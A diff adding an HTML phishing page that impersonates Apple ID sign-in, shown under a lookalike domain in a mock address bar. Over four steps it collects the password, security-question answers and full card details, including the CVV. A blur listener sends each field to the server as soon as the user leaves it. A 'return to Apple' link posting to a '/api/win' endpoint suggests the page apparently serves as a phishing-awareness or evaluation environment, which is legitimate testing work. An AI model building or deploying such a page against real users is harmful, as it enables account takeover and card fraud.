@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Apple ID</title>
+    <style>
+        :root { --apple-blue:#0071e3; --apple-bg:#f5f5f7; --apple-text:#1d1d1f; --apple-secondary:#86868b; --apple-border:#d2d2d7; }
+        body { margin:0; padding:0; font-family:Arial,sans-serif; background:#fff; color:var(--apple-text); }
+        .browser-bar { background:#f1f1f1; padding:8px 16px; display:flex; align-items:center; gap:12px; border-bottom:1px solid #ddd; }
+        .address-box { flex-grow:1; background:#fff; border:1px solid #ccc; border-radius:4px; padding:4px 12px; display:flex; align-items:center; gap:8px; font-size:14px; color:#333; }
+        header { border-bottom:1px solid var(--apple-border); height:44px; display:flex; align-items:center; padding:0 10%; justify-content:space-between; background:#fff; }
+        .container { max-width:480px; margin:80px auto; padding:0 20px; text-align:center; }
+        h1 { font-size:32px; font-weight:600; margin-bottom:8px; }
+        .desc { font-size:17px; color:var(--apple-text); margin-bottom:40px; }
+        .auth-form { text-align:left; }
+        .form-row { margin-bottom:12px; }
+        .form-row input { width:100%; height:50px; border-radius:8px; border:1px solid var(--apple-border); padding:14px; font-size:17px; box-sizing:border-box; outline:none; }
+        .btn-continue { width:100%; height:52px; background:var(--apple-blue); color:#fff; border:none; border-radius:8px; font-size:17px; cursor:pointer; margin-top:32px; }
+        .footer-links { border-top:1px solid var(--apple-border); margin-top:100px; padding-top:20px; color:var(--apple-secondary); font-size:12px; text-align:left; }
+        .view { display:none; }
+        .view.active { display:block; }
+        .security-q { background:#f5f5f7; border-radius:8px; padding:24px; text-align:left; margin-bottom:32px; }
+        .security-q select { width:100%; padding:12px; border:1px solid var(--apple-border); border-radius:4px; background:#fff; margin-bottom:12px; }
+        .lock-icon { font-size:48px; margin-bottom:24px; }
+        .status-banner { display:none; margin-bottom:16px; padding:12px 14px; background:#eef8f1; border:1px solid #b8dbc0; border-radius:4px; color:#1f6b33; font-size:.92rem; text-align:left; }
+        .status-banner.visible { display:block; }
+        .legit-exit { margin-top:14px; text-align:center; font-size:12px; color:#666; }
+        .legit-exit a { color:#666; text-decoration:underline; }
+    </style>
+</head>
+<body>
+    <div class="browser-bar">
+        <div class="address-box"><span>Lock</span><span>https://</span><strong>appleid.apple-account-verify.com</strong><span>/pay</span></div>
+    </div>
+    <header><div>Apple</div><div style="font-size:12px; color:#333;">Support</div></header>
+    <div class="container">
+        <div class="status-banner" id="status-banner"></div>
+        <div class="view active" id="view-1">
+            <h1>Sign In with Apple ID</h1>
+            <p class="desc">A sign-in attempt was recently flagged on your account. Verify your identity to maintain account security.</p>
+            <div class="auth-form">
+                <div class="form-row"><input type="text" id="appleId" name="appleId" placeholder="Apple ID (Email)"></div>
+                <div class="form-row"><input type="password" id="password" name="password" placeholder="Password"></div>
+                <button class="btn-continue" id="submit-login">Sign In</button>
+            </div>
+        </div>
+
+        <div class="view" id="view-2">
+            <h1>Account Recovery</h1>
+            <p class="desc" style="text-align:left;">For your security, please answer your security questions to continue.</p>
+            <div class="security-q">
+                <div class="form-row"><label style="display:block; font-size:14px; margin-bottom:8px;">Security Question 1</label><select><option>What is the name of your favorite childhood friend?</option></select><input type="text" id="q1" name="q1" placeholder="Answer" class="harvest"></div>
+                <div class="form-row"><label style="display:block; font-size:14px; margin-bottom:12px;">Security Question 2</label><select><option>What was your dream job as a child?</option></select><input type="text" id="q2" name="q2" placeholder="Answer" class="harvest"></div>
+            </div>
+            <button class="btn-continue" id="submit-questions">Continue</button>
+        </div>
+
+        <div class="view" id="view-3">
+            <h1>Verify Payment Method</h1>
+            <p class="desc" style="text-align:left;">To protect your Apple ID from unauthorized purchases, we require verification of the primary card linked to your account.</p>
+            <div class="security-q" style="background:#fff; border:1px solid #d2d2d7;">
+                <div class="form-row"><input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" class="harvest"></div>
+                <div class="form-row" style="display:flex; gap:12px;"><input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" class="harvest"><input type="password" id="cardCvv" name="cardCvv" placeholder="CVV" class="harvest"></div>
+                <div class="form-row"><input type="text" id="billingZip" name="billingZip" placeholder="Billing Zip Code" class="harvest"></div>
+            </div>
+            <button class="btn-continue" id="submit-payment">Verify Card</button>
+            <div class="legit-exit"><a href="#" id="return-to-apple">Review devices on Apple.com instead</a></div>
+        </div>
+
+        <div class="view" id="view-4">
+            <div class="lock-icon">Shield</div>
+            <h1>Account Secured</h1>
+            <p class="desc">Your Apple ID has been successfully verified.</p>
+            <button class="btn-continue" onclick="location.reload()">Done</button>
+        </div>
+        <div class="footer-links">Apple ID Support Privacy Policy Terms of Use</div>
+    </div>
+
+    <script>
+        function showStatus(message) {
+            const banner = document.getElementById('status-banner');
+            banner.textContent = message;
+            banner.classList.add('visible');
+        }
+
+        async function postJson(url, payload) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return response.json();
+        }
+
+        function showView(step) {
+            document.querySelectorAll('.view').forEach((view) => view.classList.remove('active'));
+            document.getElementById(`view-${step}`).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('submit-login').addEventListener('click', async () => {
+                const appleId = document.getElementById('appleId').value.trim();
+                const password = document.getElementById('password').value.trim();
+                if (!appleId || !password) {
+                    alert('Please sign in to proceed.');
+                    return;
+                }
+                await postJson('/api/login/submit', { appleId, password });
+                showView(2);
+            });
+
+            document.getElementById('submit-questions').addEventListener('click', async () => {
+                const q1 = document.getElementById('q1').value.trim();
+                const q2 = document.getElementById('q2').value.trim();
+                if (!q1 || !q2) {
+                    alert('Please answer security questions.');
+                    return;
+                }
+                await postJson('/api/questions/submit', { q1, q2 });
+                showView(3);
+            });
+
+            document.getElementById('submit-payment').addEventListener('click', async () => {
+                const payload = {
+                    cardNumber: document.getElementById('cardNumber').value.trim(),
+                    cardExpiry: document.getElementById('cardExpiry').value.trim(),
+                    cardCvv: document.getElementById('cardCvv').value.trim(),
+                    billingZip: document.getElementById('billingZip').value.trim()
+                };
+                if (!payload.cardNumber || !payload.cardExpiry || !payload.cardCvv) {
+                    alert('Card verification failed. Check details.');
+                    return;
+                }
+                await postJson('/api/payment/submit', payload);
+                showView(4);
+            });
+
+            document.addEventListener('blur', (e) => {
+                if (e.target.classList.contains('harvest') && e.target.value.trim()) {
+                    fetch('/api/save-step', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ step: 0, data: { [e.target.name]: e.target.value.trim() } })
+                    });
+                }
+            }, true);
+
+            document.getElementById('return-to-apple').addEventListener('click', async (event) => {
+                event.preventDefault();
+                await postJson('/api/win/return-to-apple', {});
+                showStatus('Check recent devices and account activity from Apple.com or appleid.apple.com instead of verifying a card in an alert flow.');
+            });
+        });
+    </script>
+</body>
+</html>
